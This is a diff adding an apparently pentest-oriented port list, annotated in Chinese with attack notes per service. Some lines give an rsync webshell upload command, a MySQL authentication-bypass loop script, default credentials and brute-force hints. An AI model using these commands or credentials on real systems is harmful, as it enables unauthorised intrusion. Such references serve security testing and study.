@@ -1,0 +1,469 @@
+﻿http://life.chacuo.net/convertshupai
+
+
+web
+80，5050，7777，6788，6789，8000，8001，8008，8012，8089，8081，8090，8088，8089，8099
+ftp-data	20/tcp
+ftp		21/tcp 		ftp匿名访问； 弱口令&爆破
+fsp		21/udp		fspd
+ssh		22/tcp				# SSH 弱口令&爆破
+ssh		22/udp
+telnet		23/tcp          无认证
+smtp		25/tcp		mail  postfic SMTP shellshock Exploit ；邮箱源地址伪造
+tacacs		49/tcp				# Login Host Protocol (TACACS)
+tacacs		49/udp
+re-mail-ck	50/tcp				# Remote Mail Checking Protocol
+re-mail-ck	50/udp
+domain		53/tcp				# Domain Name Server
+domain		53/udp
+tftp		69/udp
+sunrpc		111/tcp		portmapper	# RPC 4.0 portmapper
+sunrpc		111/udp		portmapper
+auth		113/tcp		authentication tap ident
+sftp		115/tcp
+NTP 		123    nmap -sU -pU:123 -n --script=ntp-monlist 10.10.10.10
+loc-srv		135/tcp		epmap		# Location Service
+loc-srv		135/udp		epmap
+netbios-ns	137/tcp				# NETBIOS Name Service
+netbios-ns	137/udp
+netbios-dgm	138/tcp				# NETBIOS Datagram Service
+netbios-dgm	138/udp
+netbios-ssn	139/tcp				# NETBIOS session service
+netbios-ssn	139/udp
+imap2		143/tcp		imap		# Interim Mail Access P 2 and 4
+imap2		143/udp		imap
+snmp		161/tcp		snmp默认团体名，信息泄露； cve-2012-3268
+snmp		161/udp
+snmp-trap	162/tcp		snmptrap	# Traps for SNMP
+snmp-trap	162/udp		snmptrap
+
+irc		194/tcp				# Internet Relay Chat
+irc		194/udp
+smux		199/tcp				# SNMP Unix Multiplexer
+smux		199/udp
+ipx		213/tcp				# IPX
+ipx		213/udp
+imap3		220/tcp				# Interactive Mail Access
+imap3		220/udp				# Protocol v3
+pawserv		345/tcp				# Perf Analysis Workbench
+pawserv		345/udp
+zserv		346/tcp				# Zebra server
+zserv		346/udp
+fatserv		347/tcp				# Fatmen Server
+fatserv		347/udp
+rpc2portmap	369/tcp
+rpc2portmap	369/udp				# Coda portmapper
+codaauth2	370/tcp
+codaauth2	370/udp				# Coda authentication server
+clearcase	371/tcp		Clearcase
+clearcase	371/udp		Clearcase
+ulistserv	372/tcp				# UNIX Listserv
+ulistserv	372/udp
+ldap		389/tcp		# LDAP匿名访问；查询快速提升域权限；LDAP注入
+ldap		389/udp
+https		443/tcp				# heartbleed 
+https		443/udp
+snpp		444/tcp				# Simple Network Paging Protocol
+snpp		444/udp
+microsoft-ds	445/tcp				# Microsoft Naked CIFS
+microsoft-ds	445/udp
+kpasswd		464/tcp
+kpasswd		464/udp
+urd		465/tcp		ssmtp smtps  # URL Rendesvous Directory for SSM
+saft		487/tcp			# Simple Asynchronous File Transfer
+saft		487/udp
+
+isakmp		500/tcp			# IPsec - Internet Security Association
+isakmp		500/udp			#  and Key Management Protocol
+
+rtsp		554/tcp			# Real Time Stream Control Protocol
+rtsp		554/udp
+nqs		607/tcp				# Network Queuing system
+nqs		607/udp
+ 
+asf-rmcp	623/udp		# ASF Remote Management and Control Protocol
+qmqp		628/tcp
+qmqp		628/udp
+ipp		631/tcp				# Internet Printing Protocol
+ipp		631/udp
+#
+# UNIX specific services
+#
+exec 	512；513		exec执行认证，rlogin执行登陆安全隐患
+exec		512/TCP 		#exec执行认证	,rlogin执行登录安全隐患
+biff		512/udp		comsat
+login		513/tcp 		#exec执行认证	,rlogin执行登录安全隐患
+who		513/udp		whod
+shell		514/tcp		cmd		# no passwords used
+syslog		514/udp
+printer		515/tcp		spooler		# line printer spooler
+  
+idfp		549/tcp
+idfp		549/udp
+remotefs	556/tcp		rfs_server rfs	# Brunhoff remote filesystem
+nntps		563/tcp		snntp		# NNTP over SSL
+nntps		563/udp		snntp
+submission	587/tcp				# Submission [RFC4409]
+submission	587/udp
+ldaps		636/tcp				# LDAP over SSL
+ldaps		636/udp
+tinc		655/tcp				# tinc control port
+tinc		655/udp
+silc		706/tcp
+silc		706/udp
+kerberos-adm	749/tcp				# Kerberos `kadmin' (v5)
+#
+webster		765/tcp				# Network dictionary
+webster		765/udp
+rsync		873/tcp 		#rsync支持匿名，也可以跑弱口令
+		#写文件webshell  rsync -vzrtopg --progress ./s.php x.x.x.x::www/x.x.com
+rsync		873/udp   	#读文件 rsync -vzrtopg --progress --delete username@x.x.x.x::out/home/test/getfile
+ftps-data	989/tcp				# FTP over SSL (data)
+ftps		990/tcp
+telnets		992/tcp				# Telnet over SSL
+telnets		992/udp
+imaps		993/tcp				# IMAP over SSL
+imaps		993/udp
+ircs		994/tcp				# IRC over SSL
+ircs		994/udp
+pop3s		995/tcp				# POP-3 over SSL
+pop3s		995/udp
+ 
+socks		1080/tcp			# socks proxy server
+socks		1080/udp
+proofd		1093/tcp
+proofd		1093/udp
+rootd		1094/tcp
+rootd		1094/udp
+openvpn		1194/tcp
+openvpn		1194/udp
+rmiregistry	1099/tcp			# Java RMI Registry
+rmiregistry	1099/udp
+kazaa		1214/tcp
+kazaa		1214/udp
+nessus		1241/tcp			# Nessus vulnerability
+nessus		1241/udp			#  assessment scanner
+lotusnote	1352/tcp	lotusnotes	# Lotus Note
+lotusnote	1352/udp	lotusnotes
+ms-sql-s	1433/tcp			# Microsoft SQL Server
+ms-sql-s	1433/udp
+ms-sql-m	1434/tcp			# Microsoft SQL Monitor
+ms-sql-m	1434/udp
+Oracle 		1521
+ingreslock	1524/tcp
+ingreslock	1524/udp
+prospero-np	1525/tcp			# Prospero non-privileged
+prospero-np	1525/udp
+datametrics	1645/tcp	old-radius
+datametrics	1645/udp	old-radius
+sa-msg-port	1646/tcp	old-radacct
+sa-msg-port	1646/udp	old-radacct
+kermit		1649/tcp
+kermit		1649/udp
+groupwise	1677/tcp
+groupwise	1677/udp
+l2f		1701/tcp	l2tp
+l2f		1701/udp	l2tp
+radius		1812/tcp
+radius		1812/udp
+radius-acct	1813/tcp	radacct		# Radius Accounting
+radius-acct	1813/udp	radacct
+msnp		1863/tcp			# MSN Messenger
+msnp		1863/udp
+bes			1900		bes默认管理后台http://www.bessystem.com/
+unix-status	1957/tcp			# remstats unix-status server
+log-server	1958/tcp			# remstats log server
+remoteping	1959/tcp			# remstats remoteping server
+cisco-sccp	2000/tcp			# Cisco SCCP
+cisco-sccp	2000/udp
+search		2010/tcp	ndtp
+pipe-server	2010/tcp	pipe_server
+nfs		2049/tcp			# Network File System
+nfs		2049/udp			# Network File System
+cpanel	2083；2083  cpanel主机管理系统登陆（国外）
+gnunet		2086/tcp
+gnunet		2086/udp
+rtcm-sc104	2101/tcp			# RTCM SC-104 IANA 1/29/99
+rtcm-sc104	2101/udp
+gsigatekeeper	2119/tcp
+gsigatekeeper	2119/udp
+DA虚拟主机管理 		2222		direct admin 
+gris		2135/tcp		# Grid Resource Information Server
+gris		2135/udp
+cvspserver	2401/tcp			# CVS client/server operations
+cvspserver	2401/udp
+venus		2430/tcp			# codacon port
+venus		2430/udp			# Venus callback/wbc interface
+venus-se	2431/tcp			# tcp side effects
+venus-se	2431/udp			# udp sftp side effect
+codasrv		2432/tcp			# not used
+codasrv		2432/udp			# server port
+codasrv-se	2433/tcp			# tcp side effects
+codasrv-se	2433/udp			# udp sftp side effect
+mon		2583/tcp			# MON traps
+mon		2583/udp
+zebra 	2601:2604   	#zebra-route  passwd:zebra
+dict		2628/tcp			# Dictionary server
+dict		2628/udp
+f5-globalsite	2792/tcp
+f5-globalsite	2792/udp
+gsiftp		2811/tcp
+gsiftp		2811/udp
+gpsd		2947/tcp
+gpsd		2947/udp
+gds-db		3050/tcp	gds_db		# InterBase server
+gds-db		3050/udp	gds_db
+squid		3128:3312	空口令；利用错误机制，http-only bypass
+icpv2		3130/tcp	icp		# Internet Cache Protocol
+icpv2		3130/udp	icp
+iscsi-target	3260/tcp
+kangle 		3311;3312	无需登录获取用户信息 http://www.wooyun.org/bugs/wooyun-2014-058173/	wooyun-2014-054757	 
+mysql		3306/TCP      任意密码登录 All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are vulnerable.MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.
+ 测试方法：use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+ 测试方法： $ for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done
+ 测试方法：
+```
+#!/usr/bin/python
+import subprocess
+while 1:
+        subprocess.Popen("mysql -u root mysql --password=blah", shell=True).wait()
+```
+mysql		3306/udp
+rdp    3389
+nut		3493/tcp			# Network UPS Tools
+nut		3493/udp
+distcc		3632/tcp			# distributed compiler
+distcc		3632/udp
+daap		3689/tcp			# Digital Audio Access Protocol
+daap		3689/udp
+svn		3690/tcp	subversion	# Subversion protocol
+svn		3690/udp	subversion
+suucp		4031/tcp			# UUCP over SSL
+suucp		4031/udp
+sysrqd		4094/tcp			# sysrq daemon
+sysrqd		4094/udp
+sieve		4190/tcp			# ManageSieve Protocol
+epmd		4369/tcp			# Erlang Port Mapper Daemon
+epmd		4369/udp
+remctl		4373/tcp		# Remote Authenticated Command Service
+remctl		4373/udp
+f5-iquery	4353/tcp			# F5 iQuery
+f5-iquery	4353/udp
+rundeck		4440			# weakpassword
+ipsec-nat-t	4500/udp			# IPsec NAT-Traversal [RFC3947]
+iax		4569/tcp			# Inter-Asterisk eXchange
+iax		4569/udp
+mtn		4691/tcp			# monotone Netsync Protocol
+mtn		4691/udp
+radmin-port	4899/tcp			# RAdmin Port
+radmin-port	4899/udp
+rfe		5002/udp			# Radio Free Ethernet
+rfe		5002/tcp
+mmcc		5050/tcp	# multimedia conference control tool (Yahoo IM)
+mmcc		5050/udp
+sip		5060/tcp			# Session Initiation Protocol
+sip		5060/udp
+sip-tls		5061/tcp
+sip-tls		5061/udp
+aol		5190/tcp			# AIM
+aol		5190/udp
+xmpp-client	5222/tcp	jabber-client	# Jabber Client Connection
+xmpp-client	5222/udp	jabber-client
+xmpp-server	5269/tcp	jabber-server	# Jabber Server Connection
+xmpp-server	5269/udp	jabber-server
+cfengine	5308/tcp
+cfengine	5308/udp
+mdns		5353/tcp			# Multicast DNS
+mdns		5353/udp
+postgresql	5432/tcp	postgres	# PostgreSQL Database
+postgresql	5432/udp	postgres
+freeciv		5556/tcp	rptp		# Freeciv gameplay
+freeciv		5556/udp
+amqps		5671/tcp			# AMQP protocol over TLS/SSL
+amqp协议	5672/tcp     RabbitMQ
+amqp		5672/udp
+amqp		5672/sctp
+ggz		5688/tcp			# GGZ Gaming Zone
+ggz		5688/udp
+vnc 	5900  vnc-info;realvnc-auth-bypass;vnc-brute[nmap脚本]
+varnish		6082  	#
+gnutella-svc	6346/tcp			# gnutella
+gnutella-svc	6346/udp
+gnutella-rtr	6347/tcp			# gnutella
+gnutella-rtr	6347/udp
+sge-qmaster	6444/tcp	sge_qmaster	# Grid Engine Qmaster Service
+sge-qmaster	6444/udp	sge_qmaster
+sge-execd	6445/tcp	sge_execd	# Grid Engine Execution Service
+sge-execd	6445/udp	sge_execd
+mysql-proxy	6446/tcp			# MySQL Proxy
+mysql-proxy	6446/udp
+afs3-fileserver 7000/tcp	bbs		# file server itself
+afs3-fileserver 7000/udp	bbs
+afs3-callback	7001/tcp			# callbacks to cache managers
+afs3-callback	7001/udp
+afs3-prserver	7002/tcp			# users & groups database
+afs3-prserver	7002/udp
+afs3-vlserver	7003/tcp			# volume location database
+afs3-vlserver	7003/udp
+afs3-kaserver	7004/tcp			# AFS/Kerberos authentication
+afs3-kaserver	7004/udp
+afs3-volser	7005/tcp			# volume managment server
+afs3-volser	7005/udp
+afs3-errors	7006/tcp			# error interpretation service
+afs3-errors	7006/udp
+afs3-bos	7007/tcp			# basic overseer process
+afs3-bos	7007/udp
+afs3-update	7008/tcp			# server-to-server updater
+afs3-update	7008/udp
+afs3-rmtsys	7009/tcp			# remote cache manager service
+afs3-rmtsys	7009/udp
+font-service	7100/tcp	xfs		# X Font Service
+font-service	7100/udp	xfs
+http-alt	8080/tcp	webcache	# WWW caching service
+http-alt	8080/udp
+bacula-dir	9101/tcp			# Bacula Director
+bacula-dir	9101/udp
+bacula-fd	9102/tcp			# Bacula File Daemon
+bacula-fd	9102/udp
+bacula-sd	9103/tcp			# Bacula Storage Daemon
+bacula-sd	9103/udp
+xmms2		9667/tcp	# Cross-platform Music Multiplexing System
+xmms2		9667/udp
+nbd		10809/tcp			# Linux Network Block Device
+zabbix-agent	10050/tcp			# Zabbix Agent
+zabbix-agent	10050/udp
+zabbix-trapper	10051/tcp			# Zabbix Trapper
+zabbix-trapper	10051/udp
+amanda		10080/tcp			# amanda backup services
+amanda		10080/udp
+dicom		11112/tcp
+hkp		11371/tcp			# OpenPGP HTTP Keyserver
+hkp		11371/udp
+bprd		13720/tcp			# VERITAS NetBackup
+bprd		13720/udp
+bpdbm		13721/tcp			# VERITAS NetBackup
+bpdbm		13721/udp
+bpjava-msvc	13722/tcp			# BP Java MSVC Protocol
+bpjava-msvc	13722/udp
+vnetd		13724/tcp			# Veritas Network Utility
+vnetd		13724/udp
+bpcd		13782/tcp			# VERITAS NetBackup
+bpcd		13782/udp
+vopied		13783/tcp			# VERITAS NetBackup
+vopied		13783/udp
+db-lsp		17500/tcp			# Dropbox LanSync Protocol
+dcap		22125/tcp			# dCache Access Protocol
+gsidcap		22128/tcp			# GSI dCache Access Protocol
+wnn6		22273/tcp			# wnn6
+wnn6		22273/udp
+
+supfilesrv	871/tcp				# SUP server
+supfiledbg	1127/tcp			# SUP debugging
+
+linuxconf	98/tcp				# LinuxConf
+poppassd	106/tcp				# Eudora
+poppassd	106/udp
+moira-db	775/tcp		moira_db	# Moira database
+moira-update	777/tcp		moira_update	# Moira update protocol
+moira-ureg	779/udp		moira_ureg	# Moira user registration
+spamd		783/tcp				# spamassassin daemon
+omirr		808/tcp		omirrd		# online mirror
+omirr		808/udp		omirrd
+customs		1001/tcp			# pmake customs server
+customs		1001/udp
+skkserv		1178/tcp			# skk jisho server port
+predict		1210/udp			# predict -- satellite tracking
+rmtcfg		1236/tcp			# Gracilis Packeten remote config server
+wipld		1300/tcp			# Wipl network monitor
+xtel		1313/tcp			# french minitel
+xtelw		1314/tcp			# french minitel
+support		1529/tcp			# GNATS
+cfinger		2003/tcp			# GNU Finger
+frox		2121/tcp			# frox: caching ftp proxy
+ninstall	2150/tcp			# ninstall service
+ninstall	2150/udp
+zebrasrv	2600/tcp			# zebra service
+zebra		2601/tcp			# zebra vty
+ripd		2602/tcp			# ripd vty (zebra)
+ripngd		2603/tcp			# ripngd vty (zebra)
+ospfd		2604/tcp			# ospfd vty (zebra)
+bgpd		2605/tcp			# bgpd vty (zebra)
+ospf6d		2606/tcp			# ospf6d vty (zebra)
+ospfapi		2607/tcp			# OSPF-API
+isisd		2608/tcp			# ISISd vty (zebra)
+afbackup	2988/tcp			# Afbackup system
+afbackup	2988/udp
+afmbackup	2989/tcp			# Afmbackup system
+afmbackup	2989/udp
+xtell		4224/tcp			# xtell server
+fax		4557/tcp			# FAX transmission service (old)
+hylafax		4559/tcp			# HylaFAX client-server protocol (new)
+distmp3		4600/tcp			# distmp3host daemon
+munin		4949/tcp	lrrd		# Munin
+enbd-cstatd	5051/tcp			# ENBD client statd
+enbd-sstatd	5052/tcp			# ENBD server statd
+pcrd		5151/tcp			# PCR-1000 Daemon
+noclog		5354/tcp			# noclogd with TCP (nocol)
+noclog		5354/udp			# noclogd with UDP (nocol)
+hostmon		5355/tcp			# hostmon uses TCP (nocol)
+hostmon		5355/udp			# hostmon uses UDP (nocol)
+rplay		5555/udp			# RPlay audio service
+nrpe		5666/tcp			# Nagios Remote Plugin Executor
+nsca		5667/tcp			# Nagios Agent - NSCA
+mrtd		5674/tcp			# MRT Routing Daemon
+bgpsim		5675/tcp			# MRT Routing Simulator
+canna		5680/tcp			# cannaserver
+redis		6379
+syslog-tls	6514/tcp			# Syslog over TLS [RFC5425]
+sane-port	6566/tcp	sane saned	# SANE network scanner daemon
+ircd		6667/tcp			# Internet Relay Chat
+zope-ftp	8021/tcp			# zope management by ftp
+weblogic	7001			#弱口令 weblogic/weblogic
+tproxy		8081/tcp			# Transparent Proxy
+omniorb		8088/tcp			# OmniORB
+jboss		8089			#admin
+ganglia		8649
+clc-build-daemon 8990/tcp			# Common lisp build daemon
+fastcgi			9000			#fastcgi服务：器解析漏洞
+IBMser			9090			#服务信息泄密
+elasticsearch 	9200 	#命令执行，信息泄漏
+mandelspawn	9359/udp	mandelbrot	# network mandelbrot
+git		9418/tcp			# Git Version Control System
+zope		9673/tcp			# zope server
+amh			9999			#amh加密版
+webmin		10000/tcp
+kamanda		10081/tcp			# amanda backup services (Kerberos)
+kamanda		10081/udp
+amandaidx	10082/tcp			# amanda backup services
+amidxtape	10083/tcp			# amanda backup services
+smsqp		11201/tcp			# Alamin SMS gateway
+smsqp		11201/udp
+
+Memcached 	11211		#未授权访问
+mongodb		27017		#未授权访问
+Memcached	28017		#未授权访问
+
+xpilot		15345/tcp			# XPilot Contact Port
+xpilot		15345/udp
+sgi-cmsd	17001/udp		# Cluster membership services daemon
+sgi-crsd	17002/udp
+sgi-gcd		17003/udp			# SGI Group membership daemon
+sgi-cad		17004/tcp			# Cluster Admin daemon
+isdnlog		20011/tcp			# isdn logging system
+isdnlog		20011/udp
+vboxd		20012/tcp			# voice box system
+vboxd		20012/udp
+binkp		24554/tcp			# binkp fidonet protocol
+asp		27374/tcp			# Address Search Protocol
+asp		27374/udp
+csync2		30865/tcp			# cluster synchronization tool
+SAP 			50000			#命令执行
+hadoop		50060			#远程命令执行 集群信息泄漏
+hadoop		50070			#远程命令执行 集群信息泄漏
+dircproxy	57000/tcp			# Detachable IRC Proxy
+tfido		60177/tcp			# fidonet EMSI over telnet
+fido		60179/tcp			# fidonet EMSI over TCP
+
+
+
+
